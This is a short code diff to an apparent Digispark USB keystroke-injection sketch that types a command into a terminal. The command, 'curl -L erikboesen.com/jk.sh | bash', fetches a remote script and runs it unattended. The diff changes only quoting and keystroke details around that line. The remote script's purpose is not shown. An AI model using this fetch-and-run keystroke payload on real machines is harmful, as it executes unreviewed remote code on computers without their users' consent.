@@ -1,4 +1,5 @@
 #include "DigiKeyboard.h"
+#include <stdlib.h>
 
 
 void setup() {
@@ -22,9 +23,9 @@ void setup() {
   DigiKeyboard.delay(100);
   // Run bash command
   // Download and run join script; will now run without further input
-  DigiKeyboard.println("bash -c \"curl -L erikboesen.com/jk.sh | bash\""); 
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
+  DigiKeyboard.println("bash -c 'curl -L erikboesen.com/jk.sh | bash'");
+  DigiKeyboard.sendKeyStroke(0);
+  
   // Turn off LED
   digitalWrite(0, LOW);
   digitalWrite(1, LOW);
@@ -32,7 +33,6 @@ void setup() {
 
 
 void loop() {
-  DigiKeyboard.update();
   // this is generally not necessary but with some older systems it seems to
   // prevent missing the first character after a delay:
   exit(0);
